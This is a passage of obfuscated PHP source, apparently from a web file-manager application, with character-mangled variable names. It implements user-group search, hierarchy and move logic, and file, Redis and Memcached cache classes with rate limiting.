= $this->parseWhereLike($áÅåç¯©); $Ÿ˜ú°å¡ = $this->_makeOrder()->where($áÅåç¯©)->selectPage(20); $Ÿ˜ú°å¡ = $Ÿ˜ú°å¡ ? $Ÿ˜ú°å¡ : array($ƒ²‚ë’£[446] => array(), $ƒ²‚ë’£[443] => array()); if (!$Ÿ˜ú°å¡ || count($Ÿ˜ú°å¡[$ƒ²‚ë’£[446]]) < 5 && Input::check($Í¹ï’Èõ, $ƒ²‚ë’£[394])) { $‹ôØ¥¢â = $this->groupChildrenAll($óÜ¤É•); $ûÁ¸­ú­ = $this->_searchFromMeta($ƒ²‚ë’£[547], $Í¹ï’Èõ, 10, $‹ôØ¥¢â); $ÄÙ¯š”í = $this->_searchFromMeta($ƒ²‚ë’£[548], $Í¹ï’Èõ, 10, $‹ôØ¥¢â); $æä³Ôˆ¥ = array_merge($ûÁ¸­ú­, $ÄÙ¯š”í, $Ÿ˜ú°å¡[$ƒ²‚ë’£[446]]); $Ÿ˜ú°å¡[$ƒ²‚ë’£[446]] = array_unique_by_key($æä³Ôˆ¥, $ƒ²‚ë’£[1440]); $Ÿ˜ú°å¡[$ƒ²‚ë’£[443]][$ƒ²‚ë’£[444]] = count($Ÿ˜ú°å¡[$ƒ²‚ë’£[446]]); $Ÿ˜ú°å¡[$ƒ²‚ë’£[443]][$ƒ²‚ë’£[445]] = ceil($Ÿ˜ú°å¡[$ƒ²‚ë’£[443]][$ƒ²‚ë’£[444]] / $Ÿ˜ú°å¡[$ƒ²‚ë’£[443]][$ƒ²‚ë’£[440]]); } $this->_listDataApply($Ÿ˜ú°å¡[$ƒ²‚ë’£[446]]); return $Ÿ˜ú°å¡; } protected function groupChildrenAll($ã²¦–êË) { $‰¥À‡Ãì =& $_SERVER[öæÛ¿©¿]; if (!$ã²¦–êË) { return !1; } if (!is_array($ã²¦–êË)) { $ã²¦–êË = array($ã²¦–êË); } $·©ÍŠ² = $ã²¦–êË; foreach ($ã²¦–êË as $¬’µæÅ) { $°¬È·Ìú = $this->getInfoSimple($¬’µæÅ); $åÅ °à¤ = array($‰¥À‡Ãì[600] => array($‰¥À‡Ãì[470], $°¬È·Ìú[$‰¥À‡Ãì[600]] . $¬’µæÅ . $‰¥À‡Ãì[632])); $¸ÄÏ›œ± = $this->field($‰¥À‡Ãì[1440])->where($åÅ °à¤)->select(); $·©ÍŠ² = array_merge($·©ÍŠ², array_to_keyvalue($¸ÄÏ›œ±, $‰¥À‡Ãì[12], $‰¥À‡Ãì[1440])); } return array_unique($·©ÍŠ²); } private function _searchFromMeta($­”ø«‹, $³Ùìé¢ú, $ÛŠÓÂí, $ìğõ§¤—) { $êåŒ¼ış =& $_SERVER[öæÛ¿©¿]; $³Ùìé¢ú = strtolower($³Ùìé¢ú); $“À€›ĞÖ = array($êåŒ¼ış[95] => $­”ø«‹, $êåŒ¼ış[451] => array($êåŒ¼ış[470], "\45{$³Ùìé¢ú}\x25")); $“À€›ĞÖ = $this->parseWhereLike($“À€›ĞÖ); if ($ìğõ§¤—) { $“À€›ĞÖ[$êåŒ¼ış[1440]] = array($êåŒ¼ış[7], $ìğõ§¤—); } $äñ…õêá = Model($êåŒ¼ış[2232])->where($“À€›ĞÖ)->limit($ÛŠÓÂí)->select(); if (!$äñ…õêá) { return array(); } $äñ…õêá = array_to_keyvalue($äñ…õêá, $êåŒ¼ış[12], $êåŒ¼ış[1440]); $ „‘ì‹¢ = $this->where(array($êåŒ¼ış[2216] => array($êåŒ¼ış[7], $äñ…õêá)))->select(); if (!$ „‘ì‹¢) { return array(); } return $ „‘ì‹¢; } protected function _listDataApplyItem($«Ì¦Ñµ–) { $ÄõùÂ”ı = array($«Ì¦Ñµ–); $this->_listDataApply($ÄõùÂ”ı); return $ÄõùÂ”ı[0]; } protected function _listDataApply(&$øã±ØÍ©) { $‹õâ»Şô =& $_SERVER[öæÛ¿©¿]; if (!$øã±ØÍ©) { return; } $ù»ŒßÇ¿ = array_to_keyvalue($øã±ØÍ©, $‹õâ»Şô[12], $‹õâ»Şô[1440]); $this->_listAppendChildren($øã±ØÍ©); $this->_listAppendChildrenMember($øã±ØÍ©); $this->_listAppendMeta($øã±ØÍ©, $ù»ŒßÇ¿); $this->_listAppendParent($øã±ØÍ©); $this->_listAppendSourceRoot($øã±ØÍ©, $ù»ŒßÇ¿); } private function _listAppendChildren(&$·á¾¹’æ) { $¤Šö ¥Ü =& $_SERVER[öæÛ¿©¿]; $ûİ•œÈ = array_to_keyvalue($·á¾¹’æ, $¤Šö ¥Ü[12], $¤Šö ¥Ü[1440]); $‡µî°Ëç = array($¤Šö ¥Ü[191] => array($¤Šö ¥Ü[7], $ûİ•œÈ)); $ÒÊ•ıÊ = array($¤Šö ¥Ü[191], $¤Šö ¥Ü[2233] => $¤Šö ¥Ü[581]); $ñ‡ú„ñ = $this->field($ÒÊ•ıÊ)->where($‡µî°Ëç)->group($¤Šö ¥Ü[191])->select(); $»’˜Óöê = array_to_keyvalue($ñ‡ú„ñ, $¤Šö ¥Ü[191], $¤Šö ¥Ü[581]); foreach ($·á¾¹’æ as &$¥ìÒÀÚ) { $”ï½ˆå = $¥ìÒÀÚ[$¤Šö ¥Ü[1440]]; $¥ìÒÀÚ[$¤Šö ¥Ü[2234]] = isset($»’˜Óöê[$”ï½ˆå]) ? intval($»’˜Óöê[$”ï½ˆå]) : !1; } unset($¥ìÒÀÚ); } private function _listAppendChildrenMember(&$ÉŸãø) { $²õïïôé =& $_SERVER[öæÛ¿©¿]; $•Ş³÷Û° = array_to_keyvalue($ÉŸãø, $²õïïôé[12], $²õïïôé[1440]); $º³À´€İ = array($²õïïôé[1440] => array($²õïïôé[7], $•Ş³÷Û°)); $“¦òØûá = array($²õïïôé[1440], $²õïïôé[2233] => $²õïïôé[581]); $è´ê•é€ = Model($²õïïôé[2223])->field($“¦òØûá)->where($º³À´€İ)->group($²õïïôé[1440])->select(); $èÒ§–Â÷ = array_to_keyvalue($è´ê•é€, $²õïïôé[1440], $²õïïôé[581]); foreach ($ÉŸãø as &$•Ü»Ï) { $è³ÑÅñ = $•Ü»Ï[$²õïïôé[1440]]; $•Ü»Ï[$²õïïôé[2235]] = isset($èÒ§–Â÷[$è³ÑÅñ]) ? intval($èÒ§–Â÷[$è³ÑÅñ]) : !1; } unset($•Ü»Ï); } private function _listAppendMeta(&$İ®©÷»¨, $ÅğÅĞ) { $Àöƒá×Õ =& $_SERVER[öæÛ¿©¿]; $¸ÆÔÇù‹ = array($Àöƒá×Õ[1440] => array($Àöƒá×Õ[7], $ÅğÅĞ)); $öèËòşÉ = Model($Àöƒá×Õ[2222])->where($¸ÆÔÇù‹)->select(); $öèËòşÉ = array_to_keyvalue_group($öèËòşÉ, $Àöƒá×Õ[1440]); foreach ($öèËòşÉ as &$êá›˜ÔÂ) { $êá›˜ÔÂ = array_to_keyvalue($êá›˜ÔÂ, $Àöƒá×Õ[95], $Àöƒá×Õ[451]); } unset($êá›˜ÔÂ); foreach ($İ®©÷»¨ as &$§¬ÄéïÃ) { $§¬ÄéïÃ[$Àöƒá×Õ[551]] = array(); if (isset($öèËòşÉ[$§¬ÄéïÃ[$Àöƒá×Õ[1440]]])) { $§¬ÄéïÃ[$Àöƒá×Õ[551]] = $öèËòşÉ[$§¬ÄéïÃ[$Àöƒá×Õ[1440]]]; } } unset($§¬ÄéïÃ); } protected function parentLevelArray($©»ÕÆÁõ) { $¸ºšÆ¿¬ =& $_SERVER[öæÛ¿©¿]; $©»ÕÆÁõ = explode($¸ºšÆ¿¬[50], trim($©»ÕÆÁõ, $¸ºšÆ¿¬[50])); $©»ÕÆÁõ = array_remove_value($©»ÕÆÁõ, $¸ºšÆ¿¬[229]); return $©»ÕÆÁõ; } protected function parentInGroup($ÖşÊ¼„, $ÄıÔø¿Š) { $¶ıôŸ =& $_SERVER[öæÛ¿©¿]; $Œëû«š¯ = $this->getInfoSimple($ÖşÊ¼„); if (!$Œëû«š¯) { return !0; } $ÔßƒÍùå = $this->parentLevelArray($Œëû«š¯[$¶ıôŸ[600]]); $ÔßƒÍùå[] = $ÖşÊ¼„; foreach ($ÔßƒÍùå as $ÖşÊ¼„) { if (in_array($ÖşÊ¼„ . $¶ıôŸ[12], $ÄıÔø¿Š)) { return !0; } } return !1; } private function _listAppendParent(&$ıµ¿í») { $íÖªô›Š =& $_SERVER[öæÛ¿©¿]; $Ìƒ·µè = array(); foreach ($ıµ¿í» as &$‹â‘Â°á) { $Ìƒ·µè[$‹â‘Â°á[$íÖªô›Š[1440]]] = $‹â‘Â°á[$íÖªô›Š[32]]; $ÒÏŞ­× = $this->parentLevelArray($‹â‘Â°á[$íÖªô›Š[600]]); foreach ($ÒÏŞ­× as $çÂ½ê®Š) { if (!isset($Ìƒ·µè[$çÂ½ê®Š])) { $Ìƒ·µè[$çÂ½ê®Š] = 0; } } } unset($‹â‘Â°á); foreach ($Ìƒ·µè as $·Èåî’œ => $ÚÌ³œô­) { if ($ÚÌ³œô­) { continue; } $ßŒêé¹ô = $this->getInfoSimple($·Èåî’œ); $Ìƒ·µè[$·Èåî’œ] = $ßŒêé¹ô[$íÖªô›Š[32]]; } $¬šäğÄÕ = $GLOBALS[$íÖªô›Š[6]][$íÖªô›Š[92]][$íÖªô›Š[2236]]; if (KodUser::isRoot()) { $¬šäğÄÕ = !1; } foreach ($ıµ¿í» as &$‹â‘Â°á) { $ÒÏŞ­× = $this->parentLevelArray($‹â‘Â°á[$íÖªô›Š[600]]); $é»ÒëŠ¯ = $íÖªô›Š[12]; foreach ($ÒÏŞ­× as $·Èåî’œ => $çÂ½ê®Š) { if ($¬šäğÄÕ && $·Èåî’œ == 0) { continue; } $é»ÒëŠ¯ .= $Ìƒ·µè[$çÂ½ê®Š] . $íÖªô›Š[8]; } if ($ÒÏŞ­×) { $é»ÒëŠ¯ .= $‹â‘Â°á[$íÖªô›Š[32]]; } $‹â‘Â°á[$íÖªô›Š[605]] = str_replace($íÖªô›Š[255], $íÖªô›Š[8], $é»ÒëŠ¯); } unset($‹â‘Â°á); } private function _listAppendSourceRoot(&$µ„Ş»ş, $¡£ËßÍ) { $Ùøœàåº =& $_SERVER[öæÛ¿©¿]; $ŞÃƒ‘¶Ç = Model($Ùøœàåº[925])->listSourceRoot(SourceModel::TYPE_GROUP, $¡£ËßÍ); $ŞÃƒ‘¶Ç = array_to_keyvalue($ŞÃƒ‘¶Ç, $Ùøœàåº[585]); $ŞÃƒ‘¶Ç = array_remove_key($ŞÃƒ‘¶Ç, $Ùøœàåº[585]); foreach ($µ„Ş»ş as &$¹ğ¤‘Ê) { $¹ğ¤‘Ê[$Ùøœàåº[90]] = $ŞÃƒ‘¶Ç[$¹ğ¤‘Ê[$Ùøœàåº[1440]]] ? $ŞÃƒ‘¶Ç[$¹ğ¤‘Ê[$Ùøœàåº[1440]]] : array(); } unset($¹ğ¤‘Ê); } protected function groupMerge($™‡˜ ÔÍ) { $™‡˜ ÔÍ = array_values(array_unique($™‡˜ ÔÍ)); $’î‡—Ù  = array(); for ($ß‚¿…Ù = 0; $ß‚¿…Ù < count($™‡˜ ÔÍ); $ß‚¿…Ù++) { $Àİ†¿ = !1; for ($Ú»µ¨ÒÔ = 0; $Ú»µ¨ÒÔ < count($™‡˜ ÔÍ); $Ú»µ¨ÒÔ++) { if ($ß‚¿…Ù == $Ú»µ¨ÒÔ) { continue; } if ($this->isParentOf($™‡˜ ÔÍ[$Ú»µ¨ÒÔ], $™‡˜ ÔÍ[$ß‚¿…Ù])) { $Àİ†¿ = !0; break; } } if (!$Àİ†¿) { $’î‡—Ù [] = $™‡˜ ÔÍ[$ß‚¿…Ù]; } } return $’î‡—Ù ; } protected function isParentOf($òÔ­Üö, $ÉøûáÙÍ) { $¤´˜ŸÓú =& $_SERVER[öæÛ¿©¿]; if (!$òÔ­Üö || !$ÉøûáÙÍ || $òÔ­Üö == $ÉøûáÙÍ) { return !1; } $áŞè‘èÆ = $this->getInfoSimple($òÔ­Üö); $°÷´¶í = $this->getInfoSimple($ÉøûáÙÍ); $Å˜‘Âíµ = $áŞè‘èÆ[$¤´˜ŸÓú[600]] . $òÔ­Üö . $¤´˜ŸÓú[50]; if (substr($°÷´¶í[$¤´˜ŸÓú[600]], 0, strlen($Å˜‘Âíµ)) == $Å˜‘Âíµ) { return !0; } return !1; } public function groupShowRoot($¿¦‘±á, $“îñ„¹¨ = false) { $ìıÙ¦† =& $_SERVER[öæÛ¿©¿]; $ë—î”€Ê = $this->getInfo($¿¦‘±á); if (!$ë—î”€Ê) { return array(); } $Ò„ÉŞ± = $this->parentLevelArray($ë—î”€Ê[$ìıÙ¦†[600]]); $ÃèÌ÷İÂ = array($¿¦‘±á); if (count($Ò„ÉŞ±) == 0) { return $ÃèÌ÷İÂ; } if ($“îñ„¹¨ && count($Ò„ÉŞ±) == 1) { return $ÃèÌ÷İÂ; } if (!$ë—î”€Ê[$ìıÙ¦†[551]] || !isset($ë—î”€Ê[$ìıÙ¦†[551]][$ìıÙ¦†[2217]]) || $ë—î”€Ê[$ìıÙ¦†[551]][$ìıÙ¦†[2217]] == $ìıÙ¦†[871]) { return $this->groupShowRoot($Ò„ÉŞ±[count($Ò„ÉŞ±) - 1], $“îñ„¹¨); } if ($ë—î”€Ê[$ìıÙ¦†[551]][$ìıÙ¦†[2217]] == $ìıÙ¦†[433]) { $£Å’„²ì = explode($ìıÙ¦†[50], $ë—î”€Ê[$ìıÙ¦†[551]][$ìıÙ¦†[2218]]); if ($£Å’„²ì) { $ÃèÌ÷İÂ = array_merge($ÃèÌ÷İÂ, $£Å’„²ì); } } return $ÃèÌ÷İÂ; } protected function resetParentLevel() { $‡–ÚÑ¿º =& $_SERVER[öæÛ¿©¿]; $²ûçİÑ÷ = $‡–ÚÑ¿º[1440]; $‚ä€µú” = $this->select(); $‚ä€µú” = array_to_keyvalue($‚ä€µú”, $²ûçİÑ÷); foreach ($‚ä€µú” as $¡ÅÙø‚İ) { $¼Å¬Ì¶· = $¡ÅÙø‚İ; $ÆÂ²ĞîÆ = array(); while ($¼Å¬Ì¶·[$‡–ÚÑ¿º[191]] != 0) { $ÆÂ²ĞîÆ[] = $¼Å¬Ì¶·[$‡–ÚÑ¿º[191]]; $¼Å¬Ì¶· = $‚ä€µú”[$¼Å¬Ì¶·[$‡–ÚÑ¿º[191]]]; } $ÆÂ²ĞîÆ[] = 0; $ÆÂ²ĞîÆ = $‡–ÚÑ¿º[50] . implode($‡–ÚÑ¿º[50], array_reverse($ÆÂ²ĞîÆ)) . $‡–ÚÑ¿º[50]; $this->setNamePinyin($¡ÅÙø‚İ[$²ûçİÑ÷], $¡ÅÙø‚İ[$‡–ÚÑ¿º[32]]); $this->where(array($²ûçİÑ÷ => $¡ÅÙø‚İ[$²ûçİÑ÷]))->save(array($‡–ÚÑ¿º[671] => $ÆÂ²ĞîÆ)); } return $‚ä€µú”; } public function groupNameAuto($Ò€¦º»¦, $Ì¼¶ƒƒ) { $¤’÷—‰ =& $_SERVER[öæÛ¿©¿]; $øâ¤°ø½ = $this->where(array($¤’÷—‰[488] => $Ò€¦º»¦))->getField($¤’÷—‰[32], !0); if (!$øâ¤°ø½ || !in_array($Ì¼¶ƒƒ, $øâ¤°ø½)) { return $Ì¼¶ƒƒ; } for ($ÁÂ¼¦©¾ = 1; $ÁÂ¼¦©¾ <= count($øâ¤°ø½) + 1; $ÁÂ¼¦©¾++) { $—§ú¥ù = $Ì¼¶ƒƒ . "\50{$ÁÂ¼¦©¾}\51"; if (!in_array($—§ú¥ù, $øâ¤°ø½)) { return $—§ú¥ù; } } } public function groupSwitch($ªûßáè, $…©ø¨¨) { $ë‡Üí’Ş =& $_SERVER[öæÛ¿©¿]; $ÁÃ€°”Ú = array($ë‡Üí’Ş[1440] => array($ë‡Üí’Ş[7], array($ªûßáè, $…©ø¨¨))); $ ‡–¬Ê = $this->where($ÁÃ€°”Ú)->select(); $ ‡–¬Ê = array_to_keyvalue($ ‡–¬Ê, $ë‡Üí’Ş[1440]); $ş–³ë€º = _get($ ‡–¬Ê, $ªûßáè); $¼ş€ú©½ = _get($ ‡–¬Ê, $…©ø¨¨); if (!$ş–³ë€º || !$¼ş€ú©½ || $ş–³ë€º[$ë‡Üí’Ş[191]] == 0) { return !1; } if ($ş–³ë€º[$ë‡Üí’Ş[1440]] == $¼ş€ú©½[$ë‡Üí’Ş[1440]]) { return !1; } if (strpos($¼ş€ú©½[$ë‡Üí’Ş[600]], $ş–³ë€º[$ë‡Üí’Ş[600]] . $ş–³ë€º[$ë‡Üí’Ş[1440]] . $ë‡Üí’Ş[50]) === 0) { return !1; } $ÁÃ€°”Ú = array($ë‡Üí’Ş[1440] => $ªûßáè); $…–ÃŞÍê = Model($ë‡Üí’Ş[2223])->where($ÁÃ€°”Ú)->select(); if (!$…–ÃŞÍê) { $…–ÃŞÍê = array(); } foreach ($…–ÃŞÍê as $õ˜è«‘¨) { $×ñæöù = $õ˜è«‘¨[$ë‡Üí’Ş[1538]]; $ÁÃ€°”Ú = array($ë‡Üí’Ş[1538] => $×ñæöù, $ë‡Üí’Ş[1440] => $…©ø¨¨); $à¥»«ĞÉ = Model($ë‡Üí’Ş[2223])->where($ÁÃ€°”Ú)->find(); if (!$à¥»«ĞÉ) { $’ää°áÄ = array($…©ø¨¨ => $õ˜è«‘¨[$ë‡Üí’Ş[1585]]); Model($ë‡Üí’Ş[613])->userGroupAdd($×ñæöù, $’ää°áÄ); } Model($ë‡Üí’Ş[613])->userGroupRemove($×ñæöù, $ªûßáè); } $ÁÃ€°”Ú = array($ë‡Üí’Ş[189] => 2, $ë‡Üí’Ş[191] => 0, $ë‡Üí’Ş[496] => 1, $ë‡Üí’Ş[585] => array($ë‡Üí’Ş[7], array($ªûßáè, $…©ø¨¨))); $‚µı„ŞĞ = Model($ë‡Üí’Ş[925])->where($ÁÃ€°”Ú)->field($ë‡Üí’Ş[2237])->select(); $‚µı„ŞĞ = array_to_keyvalue($‚µı„ŞĞ, $ë‡Üí’Ş[585], $ë‡Üí’Ş[192]); $ŞØ¶‡‡æ = !empty($‚µı„ŞĞ[$ªûßáè]) ? $‚µı„ŞĞ[$ªûßáè] : !1; if ($ŞØ¶‡‡æ) { if (!$‚µı„ŞĞ[$…©ø¨¨]) { $‚µı„ŞĞ[$…©ø¨¨] = Model($ë‡Üí’Ş[925])->groupRootAdd($…©ø¨¨); } $„¿°Ş¶ô = $‚µı„ŞĞ[$…©ø¨¨]; $ÁÃ€°”Ú = array($ë‡Üí’Ş[191] => $ŞØ¶‡‡æ); $‚µı„ŞĞ = Model($ë‡Üí’Ş[925])->where($ÁÃ€°”Ú)->field($ë‡Üí’Ş[2238])->select(); if (!$‚µı„ŞĞ) { $‚µı„ŞĞ = array(); } Model($ë‡Üí’Ş[925])->moveClearAuth = !1; foreach ($‚µı„ŞĞ as $§²Á˜Ì¿) { $ğÍƒ’ˆ¯ = $§²Á˜Ì¿[$ë‡Üí’Ş[496]] == $ë‡Üí’Ş[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ë‡Üí’Ş[925])->move($§²Á˜Ì¿[$ë‡Üí’Ş[192]], $„¿°Ş¶ô, $ğÍƒ’ˆ¯); } Model($ë‡Üí’Ş[925])->moveClearAuth = !0; $ÁÃ€°”Ú = array($ë‡Üí’Ş[189] => 2, $ë‡Üí’Ş[585] => $ªûßáè); $ü¢À¢õ× = array($ë‡Üí’Ş[585] => $…©ø¨¨); Model($ë‡Üí’Ş[2239])->where($ÁÃ€°”Ú)->save($ü¢À¢õ×); Model($ë‡Üí’Ş[2240])->where($ÁÃ€°”Ú)->save($ü¢À¢õ×); } $this->_changeChildLevel($ ‡–¬Ê[$ªûßáè], $ ‡–¬Ê[$…©ø¨¨], !0); $this->where(array($ë‡Üí’Ş[191] => $ªûßáè))->save(array($ë‡Üí’Ş[191] => $…©ø¨¨)); $this->_clearChildrenCache($ ‡–¬Ê[$…©ø¨¨]); return !0; } } goto EëŸÄ‘‚£ñ; c»“Ø—‘øñ: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $ü…ëâ¼è =& $_SERVER[öæÛ¿©¿]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $ßè“çáÙ = $GLOBALS[$ü…ëâ¼è[6]][$ü…ëâ¼è[425]]; $­ë‰æ¬ä = $ßè“çáÙ[$ßè“çáÙ[$ü…ëâ¼è[927]]]; $™©‹À¹˜ = $ßè“çáÙ[$ü…ëâ¼è[928]]; switch ($ßè“çáÙ[$ü…ëâ¼è[927]]) { case $ü…ëâ¼è[21]: self::$handle = Model($ü…ëâ¼è[929]); break; case $ü…ëâ¼è[930]: self::$handle = new CacheRedis($­ë‰æ¬ä, $™©‹À¹˜); break; case $ü…ëâ¼è[931]: self::$handle = new CacheMemcached($­ë‰æ¬ä, $™©‹À¹˜); break; case $ü…ëâ¼è[231]: self::$handle = new CacheFile($­ë‰æ¬ä, $™©‹À¹˜); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($êî¾½”) { if (is_array($êî¾½”) || is_object($êî¾½”)) { $êî¾½” = json_encode($êî¾½”); } $êî¾½” = rawurlencode($êî¾½”); return md5(KOD_SITE_ID . $_SERVER[öæÛ¿©¿][11] . $êî¾½”); } public static function get($ Ù¹©Ô, $–Šï¢Ä  = false) { $Â·ˆÃÃ¾ = self::key($ Ù¹©Ô); $…‚Ó³Á = self::init(); if ($–Šï¢Ä ) { return unserialize($…‚Ó³Á->get($Â·ˆÃÃ¾)); } if (!isset(self::$memoryCache[$Â·ˆÃÃ¾])) { $İôÁØ¾Á = $…‚Ó³Á->get($Â·ˆÃÃ¾); self::$memoryCache[$Â·ˆÃÃ¾] = unserialize($İôÁØ¾Á); } return self::$memoryCache[$Â·ˆÃÃ¾]; } public static function set($°ßŸÚ§â, $ÅÑşÂëÁ, $ÉŸÛ”É = false) { $ §Ñ® =& $_SERVER[öæÛ¿©¿]; $Æ¦§±´ü = self::key($°ßŸÚ§â); if (isset(self::$memoryCache[$Æ¦§±´ü]) && self::$memoryCache[$Æ¦§±´ü] === $ÅÑşÂëÁ) { return !0; } if ($ÉŸÛ”É === 0) { self::$memoryCache[$Æ¦§±´ü] = $ÅÑşÂëÁ; return !0; } $Íú§³‹Ñ = self::init(); $›“ÆÊá = serialize($ÅÑşÂëÁ); CacheLock::lock($°ßŸÚ§â . $ §Ñ®[932]); $íÖéã“÷ = $Íú§³‹Ñ->set($Æ¦§±´ü, $›“ÆÊá, $ÉŸÛ”É); self::$memoryCache[$Æ¦§±´ü] = $ÅÑşÂëÁ; CacheLock::unlock($°ßŸÚ§â . $ §Ñ®[932]); return $íÖéã“÷; } public static function getCall($™“¨çı, $ë­ë—ãÜ, $»Ã•ÅÁ, $­…É™†Â = array()) { $ğ§Å¢ğ¨ =& $_SERVER[öæÛ¿©¿]; $ÅÔéêßÚ = self::get($™“¨çı); if ($ÅÔéêßÚ || $ÅÔéêßÚ === $ğ§Å¢ğ¨[12]) { return $ÅÔéêßÚ; } $ÅÔéêßÚ = call_user_func_array($»Ã•ÅÁ, $­…É™†Â); $ÅÔéêßÚ = $ÅÔéêßÚ ? $ÅÔéêßÚ : $ğ§Å¢ğ¨[12]; self::set($™“¨çı, $ÅÔéêßÚ, $ë­ë—ãÜ); return $ÅÔéêßÚ; } public static function limitCall($‚ºÃ ß, $´„ü‡ì = 15, $ÙÂ¹®àô = 30, $üË¶ßŠ = true) { $ì…ìˆá =& $_SERVER[öæÛ¿©¿]; static $Çñ¬çßà = array(); if ($üË¶ßŠ) { $‚ºÃ ß = $‚ºÃ ß . $ì…ìˆá[933] . KodUser::id() . $ì…ìˆá[934] . get_client_ip(); } if (isset($Çñ¬çßà[$‚ºÃ ß]) && is_array($Çñ¬çßà[$‚ºÃ ß])) { return $Çñ¬çßà[$‚ºÃ ß][$ì…ìˆá[333]] <= $ÙÂ¹®àô; } $ôšëïÌ² = self::get($‚ºÃ ß); if (!is_array($ôšëïÌ²) || time() - $ôšëïÌ²[$ì…ìˆá[205]] > $´„ü‡ì) { $ôšëïÌ² = array($ì…ìˆá[205] => time(), $ì…ìˆá[333] => 0); } $ôšëïÌ²[$ì…ìˆá[333]]++; self::set($‚ºÃ ß, $ôšëïÌ², $´„ü‡ì); $Çñ¬çßà[$‚ºÃ ß] = $ôšëïÌ²; return $ôšëïÌ²[$ì…ìˆá[333]] <= $ÙÂ¹®àô; } public static function limitRuntime($Á‚Öàˆò, $ ƒÄ¥ÌŒ) { $Éø”•‹ = $_SERVER[öæÛ¿©¿][935] . $Á‚Öàˆò; if (isset(self::$runTimeCache[$Éø”•‹]) || !$ ƒÄ¥ÌŒ) { return !0; } $õ±ö†É§ = intval(self::get($Éø”•‹)); $õ±ö†É§ = !$õ±ö†É§ || $õ±ö†É§ <= 0 ? 1 : $õ±ö†É§ + 1; if ($õ±ö†É§ > $ ƒÄ¥ÌŒ) { return !1; } self::$runTimeCache[$Éø”•‹] = !0; self::set($Éø”•‹, $õ±ö†É§, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $²·ÅÏ´€ => $ı­»ìó‘) { $‡×Ë’Âì = intval(self::get($²·ÅÏ´€)); $‡×Ë’Âì = !$‡×Ë’Âì || $‡×Ë’Âì <= 1 ? 0 : $‡×Ë’Âì - 1; self::set($²·ÅÏ´€, $‡×Ë’Âì, 3600); } self::$runTimeCache = array(); } public static function remove($æ£ÂÏÓƒ) { $äı‘¯¹È = self::key($æ£ÂÏÓƒ); unset(self::$memoryCache[$äı‘¯¹È]); self::clearTimeout(); CacheLock::lock($æ£ÂÏÓƒ); $Œ»âˆ ß = self::init()->remove($äı‘¯¹È); CacheLock::unlock($æ£ÂÏÓƒ); return $Œ»âˆ ß; } public static function removeMemory($å‘ÜÕê) { $²óó’ä½ = self::key($å‘ÜÕê); unset(self::$memoryCache[$²óó’ä½]); } public static function clearMemory($¿õªóá¯ = false) { if ($¿õªóá¯) { $¿õªóá¯ = self::key($¿õªóá¯); unset(self::$memoryCache[$¿õªóá¯]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[öæÛ¿©¿][936])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[öæÛ¿©¿][937])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($å—ú‘Ì¶, $ÚÌ–½µ¶) { $æä´ÑÍ =& $_SERVER[öæÛ¿©¿]; $this->cachePath = $å—ú‘Ì¶[$æä´ÑÍ[87]]; $this->prefix = $æä´ÑÍ[938]; $this->cacheTime = $ÚÌ–½µ¶; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ïŠ’î®É) { $¢ñÜŒìû =& $_SERVER[öæÛ¿©¿]; $ïŠ’î®É = str_replace(array($¢ñÜŒìû[939], $¢ñÜŒìû[98], $¢ñÜŒìû[76]), $¢ñÜŒìû[940], $ïŠ’î®É); return $this->cachePath . $¢ñÜŒìû[941] . $ïŠ’î®É . $¢ñÜŒìû[942]; } public function set($Ì…–É™, $Æš«ê¢ç, $˜‹·ÅÃæ = false) { $˜‹·ÅÃæ = $˜‹·ÅÃæ ? $˜‹·ÅÃæ : $this->cacheTime; $êŞã«² = $this->getFile($Ì…–É™); if (file_put_contents($êŞã«², $this->prefix . $Æš«ê¢ç, LOCK_EX)) { @touch($êŞã«², intval(time() + $˜‹·ÅÃæ)); clearstatcache(); return !0; } @unlink($êŞã«²); return !1; } public function get($Üğ–†æî) { $®éˆ¾× = $this->getFile($Üğ–†æî); if (file_exists($®éˆ¾×) && filemtime($®éˆ¾×) < time()) { @unlink($®éˆ¾×); return !1; } $‡ßã²ãÔ = @file_get_contents($®éˆ¾×); return substr($‡ßã²ãÔ, strlen($this->prefix)); } public function remove($÷×«ÛÎ‹) { $¹Ê…¦¬à = $this->getFile($÷×«ÛÎ‹); return @unlink($¹Ê…¦¬à); } public function deleteAll() { $…áüÚ – =& $_SERVER[öæÛ¿©¿]; $´„…ƒ = scandir($this->cachePath); foreach ($´„…ƒ as $–ˆâ›¡’) { $¾Ñ€­É‘ = $this->cachePath . $–ˆâ›¡’; if (strpos($¾Ñ€­É‘, $…áüÚ –[942]) && strpos($¾Ñ€­É‘, $…áüÚ –[943])) { @unlink($¾Ñ€­É‘); } } } public function clearTimeout() { $´Ûß·è =& $_SERVER[öæÛ¿©¿]; $‘èæßá = scandir($this->cachePath); foreach ($‘èæßá as $û€¯ó÷„) { $¥¾Ì¸™ = $this->cachePath . $û€¯ó÷„; if (strpos($¥¾Ì¸™, $´Ûß·è[942]) && strpos($¥¾Ì¸™, $´Ûß·è[943]) && filemtime($¥¾Ì¸™) < time()) { @unlink($¥¾Ì¸™); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $»Î•Ğû² =& $_SERVER[öæÛ¿©¿]; if (self::$handle) { return self::$handle; } $ò¨Ş²®Î = $GLOBALS[$»Î•Ğû²[6]][$»Î•Ğû²[425]]; self::$timeout = $ò¨Ş²®Î[$»Î•Ğû²[944]] ? $ò¨Ş²®Î[$»Î•Ğû²[944]] : 10; $ååáş—é = _get($GLOBALS[$»Î•Ğû²[6]], $»Î•Ğû²[945]); $¬¯Ş´©Â = $ò¨Ş²®Î[$»Î•Ğû²[927]] ? $ò¨Ş²®Î[$»Î•Ğû²[927]] : $»Î•Ğû²[231]; if ($¬¯Ş´©Â == 